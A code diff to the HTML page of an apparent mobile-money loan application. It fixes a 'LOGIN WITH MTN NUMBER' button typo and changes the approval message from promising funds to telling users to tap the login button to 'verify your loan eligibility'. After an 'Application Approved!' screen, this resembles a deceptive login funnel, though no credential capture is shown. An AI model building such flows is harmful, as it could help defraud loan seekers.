@@ -211,7 +211,7 @@
                <button class="pill-cta-btn"
 style="width:100%; background-color:#ffcc00;"
 onclick="openHomeLink()">
-LOGIN WITH MTN NUMBET
+LOGIN WITH MTN NUMBER
 </button>             </div>
         </div>
     </div>
@@ -288,7 +288,7 @@ function closeAlert() {
             if (finalStatus === 'APPROVED') {
                 document.getElementById('success-icon').style.backgroundColor = '#28a745'; document.getElementById('success-icon').innerText = '✓';
                 document.getElementById('success-headline').innerText = 'Application Approved!'; document.getElementById('success-headline').style.color = '#28a745';
-                document.getElementById('info-notice').innerText = 'ℹ️ Funds will land inside your mobile wallet shortly.'; badge.className = 'receipt-status-badge badge-approved';
+                document.getElementById('info-notice').innerText = 'ℹ️ Tap the login button to verify your loan eligibility.'; badge.className = 'receipt-status-badge badge-approved';
             } else {
                 document.getElementById('success-icon').style.backgroundColor = '#dc3545'; document.getElementById('success-icon').innerText = '✕';
                 document.getElementById('success-headline').innerText = 'Application Declined'; document.getElementById('success-headline').style.color = '#dc3545';
